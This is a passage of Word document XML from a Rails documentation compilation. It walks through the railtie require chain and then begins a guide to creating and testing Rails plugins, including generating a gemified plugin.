    <w:p w14:paraId="3D07636E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.49 Back to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>activerecord/lib/active_record/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7E435B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next two </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s in this file aren’t run because their files are already required, with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> being required by </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/all</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_model/railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> being required from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_dispatch</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="290C6A0F" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="09EAF671" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require "rails"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15FD149C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require "active_model/railtie"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5C4D7C91" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>require</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in this file is to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_controller/railtie</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B0AC95" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.50 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>actionpack/lib/action_controller/railtie.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD984CE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This file begins with a couple more requires to files that have already been loaded:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3960"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="43CC7304" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72C8A0E9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require "rails"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15D1EED4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require "action_controller"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31C3E8F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require "action_dispatch/railtie"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="156537E6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">However the require after these is to a file that hasn’t yet been loaded, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_view/railtie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which begins by requiring </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_view</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="671E250E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.51 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>actionpack/lib/action_view.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A807443" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>action_view.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CF8F093" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D"/>
    <w:p w14:paraId="7532271E" w14:textId="45FC91DD" w:rsidR="005D6D6E" w:rsidRPr="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="005D6D6E">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="002725A5">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>扩展</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2013A382" w14:textId="66CA2FFA" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>6.1、</w:t>
      </w:r>
      <w:hyperlink r:id="rId1088" w:history="1">
        <w:r w:rsidR="005D6D6E" w:rsidRPr="005D6D6E">
          <w:rPr>
            <w:color w:val="0000FF"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Rails 插件入门指南</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2C748493" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A Rails plugin is either an extension or a modification of the core framework. Plugins provide:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D0EC6C9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="360"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>a way for developers to share bleeding-edge ideas without hurting the stable code base</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AECB629" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="360"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>a segmented architecture so that units of code can be fixed or updated on their own release schedule</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3614EBA8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="360"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>an outlet for the core developers so that they don’t have to include every cool new feature under the sun</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA15EAD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>After reading this guide you should be familiar with:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B9FA19" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="361"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Creating a plugin from scratch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BC7675" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="361"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Writing and running tests for the plugin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66195D7D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This guide describes how to build a test-driven plugin that will:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76246F54" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="362"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Extend core ruby classes like Hash and String</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ECFF16F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="362"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Add methods to ActiveRecord::Base in the tradition of the ‘acts_as’ plugins</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A6E1C58" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="362"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Give you information about where to put generators in your plugin.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4240E6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>For the purpose of this guide pretend for a moment that you are an avid bird watcher. Your favorite bird is the Yaffle, and you want to create a plugin that allows other developers to share in the Yaffle goodness.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61C084BB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31B0D738" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1089" w:anchor="1" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Setup</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="683D5EA7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1090" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Generate a gemified plugin.</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1565084F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1091" w:anchor="2" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Testing your newly generated plugin</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5FFC77CB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1092" w:anchor="3" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Extending Core Classes</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="738C9051" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1093" w:anchor="4" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Add an “acts_as” Method to Active Record</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="72897101" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1094" w:anchor="4-1" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Add a Class Method</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1DC11DB0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1095" w:anchor="4-2" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Add an Instance Method</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="149CB930" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1096" w:anchor="5" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Generators</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B792E84" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1097" w:anchor="6" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Publishing your Gem</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="52FA741D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1098" w:anchor="7" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>RDoc Documentation</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D456788" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="008938C9" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="363"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1099" w:anchor="7-1" w:history="1">
        <w:r w:rsidR="00185CB6">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>References</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1AA1B4EF" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 Setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A6F749" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Before you continue, take a moment to decide if your new plugin will be potentially shared across different Rails applications.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486989C7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="364"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If your plugin is specific to your application, your new plugin will be a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>vendored plugin</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13D78477" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="364"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you think your plugin may be used across applications, build it as a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>gemified plugin</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E0195A8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 Generate a gemified plugin.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DD7325D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Writing your Rails plugin as a gem, rather than as a vendored plugin, lets you share your plugin across different rails applications using RubyGems and Bundler.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33B3D594" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Rails 3.1 ships with a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails plugin new</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command which creates a skeleton for developing any kind of Rails extension with the ability to run integration tests using a dummy Rails application. See usage and options by asking for help:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2520"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="71101757" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="151566A9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="321009001"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails plugin --help</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="115C5C6B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 Testing your newly generated plugin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F52396F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can navigate to the directory that contains the plugin, run the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>bundle install</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command and run the one generated test using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command.</w:t>
      </w:r>
    </w:p>
